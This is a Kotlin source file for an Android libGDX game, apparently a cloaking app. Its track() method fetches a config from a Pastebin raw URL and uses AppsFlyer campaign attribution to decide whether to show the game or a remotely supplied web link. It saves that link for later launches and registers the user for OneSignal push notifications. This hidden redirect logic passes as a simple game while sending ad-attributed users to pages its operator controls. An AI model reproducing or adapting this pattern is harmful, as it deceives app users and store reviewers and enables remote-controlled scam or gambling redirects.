package com.easyru.track.game

import android.content.SharedPreferences
import androidx.appcompat.app.AppCompatActivity.MODE_PRIVATE
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.easyru.track.MainActivity
import com.easyru.track.appContext
import com.easyru.track.game.manager.MusicManager
import com.easyru.track.game.manager.NavigationManager
import com.easyru.track.game.manager.SoundManager
import com.easyru.track.game.manager.SpriteManager
import com.easyru.track.game.manager.util.MusicUtil
import com.easyru.track.game.manager.util.SoundUtil
import com.easyru.track.game.manager.util.SpriteUtil
import com.easyru.track.game.screens.LoaderScreen
import com.easyru.track.game.utils.GameColor
import com.easyru.track.game.utils.advanced.AdvancedGame
import com.easyru.track.game.utils.disposeAll
import com.easyru.track.util.log
import com.onesignal.OneSignal
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.atomic.AtomicBoolean

class GDXGame(val activity: MainActivity) : AdvancedGame() {

    lateinit var assetManager     : AssetManager      private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager    : SpriteManager     private set
    lateinit var musicManager     : MusicManager      private set
    lateinit var soundManager     : SoundManager      private set

    val assetsLoader by lazy { SpriteUtil.Loader() }
    val assetsAll    by lazy { SpriteUtil.All() }

    val musicUtil by lazy { MusicUtil()    }
    val soundUtil by lazy { SoundUtil()    }

    var backgroundColor = GameColor.background
    val disposableSet   = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)

    val sharedPreferences: SharedPreferences = activity.getSharedPreferences("easy", MODE_PRIVATE)

    var isGame = false

    override fun create() {
        navigationManager = NavigationManager()
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)

        musicManager      = MusicManager(assetManager)
        soundManager      = SoundManager(assetManager)

        navigationManager.navigate(LoaderScreen::class.java.name)

        track()
    }

    override fun render() {
        ScreenUtils.clear(backgroundColor)
        super.render()
    }

    override fun dispose() {
        try {
            log("dispose LibGDXGame")
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(assetManager, musicUtil)
            super.dispose()
        } catch (e: Exception) { log("exception: ${e.message}") }
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun track() {
        log("track")
        activity.blockRedirect = { isGame = true }
        activity.initWeb()

        val track = sharedPreferences.getString("track", "smak") ?: "smak"

        try {
            if (track == "smak") {
                coroutine.launch(Dispatchers.Main) {
                    val simJSON = withContext(Dispatchers.IO) { requestGet() }

                    if (simJSON != null) {
                        AppsFlyerLib.getInstance().init(simJSON.trak, getAppsFlyerConversionListener(simJSON.easy, simJSON.orongutang), appContext)
                        AppsFlyerLib.getInstance().start(activity, simJSON.trak, getAppsFlyerRequestListener())
                    } else {
                        isGame = true
                    }
                }
            } else {
                activity.showUrl(track)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            isGame = true
        }
    }

    private suspend fun requestGet() = CompletableDeferred<SimJSON?>().also { continuation ->
        val urlString = "https://pastebin.com/raw/zBHu6V5X"

        try {
            val url        = URL(urlString)
            val connection = url.openConnection() as HttpURLConnection

            connection.requestMethod           = "GET"
            connection.connectTimeout          = 5000
            connection.readTimeout             = 5000
            connection.instanceFollowRedirects = true

            val responseCode = connection.responseCode

            if (responseCode == HttpURLConnection.HTTP_OK) {
                val reader = BufferedReader(InputStreamReader(connection.inputStream))
                val response = StringBuilder()
                var line: String?

                while (reader.readLine().also { line = it } != null) {
                    response.append(line)
                }
                reader.close()

                val jsonResponse = JSONObject(response.toString())
                log("json = $jsonResponse")

                val getJSON = SimJSON(
                    easy       = jsonResponse.getString("easy")       ?: "",
                    trak       = jsonResponse.getString("trak")       ?: "",
                    orongutang = jsonResponse.getString("orongutang") ?: "",
                )
                continuation.complete(getJSON)

            } else {
                log("Запит не успішний. Код відповіді: $responseCode")
                continuation.complete(null)
            }
            connection.disconnect()
        } catch (e: Exception) {
            log("Error: ${e.message}")
            e.printStackTrace()
            continuation.complete(null)
        }
    }.await()

    private data class SimJSON(val easy: String, val trak: String, val orongutang: String)

    private fun getAppsFlyerConversionListener(liber: String, osmos: String) = object : AppsFlyerConversionListener {
        private val isAppsflyerGetData = AtomicBoolean(false)

        override fun onConversionDataSuccess(appfMap: MutableMap<String, Any>?) {
            if (isAppsflyerGetData.getAndSet(true)) return

            if (appfMap != null) {
                val campaign = appfMap["campaign"]     as? String
                val afAd     = appfMap["af_ad"]        as? String
                val media    = appfMap["media_source"] as? String

                log("Result: campaign = $campaign | afAd = $afAd | media_source = $media | appfMap = $appfMap")

                val link = "$liber?easycampe=$campaign&adtrack=$afAd&easymed=$media"
                log("link = $link")

                // OneSignal
                if (campaign != null) {
                    coroutine.launch(Dispatchers.Main) {
                        OneSignal.initWithContext(activity, osmos)
                        OneSignal.login(campaign)
                        withContext(Dispatchers.IO) { OneSignal.Notifications.requestPermission(false) }
                    }
                }

                coroutine.launch(Dispatchers.IO) { sharedPreferences.edit().putString("track", link).apply() }

                activity.showUrl(link)

            } else isGame = true
        }

        override fun onConversionDataFail(p0: String?) {
            if (isAppsflyerGetData.getAndSet(true)) return
            isGame = true
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }

    private fun getAppsFlyerRequestListener() = object : AppsFlyerRequestListener {
        override fun onSuccess() {
            log("AppsFlyer: onSuccess")
        }

        override fun onError(p0: Int, p1: String) {
            log("AppsFlyer: onError")
        }
    }

}